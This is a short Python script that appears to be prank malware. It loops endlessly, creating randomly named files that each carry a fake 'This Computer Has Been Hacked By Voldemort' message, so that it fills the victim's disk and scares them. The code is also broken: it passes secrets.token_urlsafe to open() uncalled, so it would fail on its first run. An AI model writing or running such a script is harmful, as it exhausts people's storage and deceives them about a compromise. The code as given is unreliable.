import secrets
while 1:
	f = open(secrets.token_urlsafe,"w")
	f.write("""
	This Computer Has Been Hacked By Voldemort. For More Details Please Break Your Computer.
	""")
	f.close()

